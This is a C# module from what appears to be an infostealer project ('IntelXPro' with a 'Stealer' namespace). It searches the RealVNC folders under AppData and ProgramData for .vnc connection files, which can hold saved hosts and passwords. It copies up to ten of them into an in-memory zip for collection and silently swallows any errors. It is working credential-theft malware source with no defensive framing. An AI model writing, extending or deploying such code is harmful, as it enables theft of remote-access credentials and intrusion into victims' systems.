using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class RealVNC : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RealVNC");
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "RealVNC");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "RealVNC";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = Directory.GetFiles(basePath, "*.vnc", SearchOption.AllDirectories);
                
                foreach (string file in configFiles.Take(10))
                {
                    string relativePath = file.Substring(basePath.Length + 1);
                    string zipPath = $"Applications\\RealVNC\\{location}\\{relativePath.Replace("\\", "/")}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
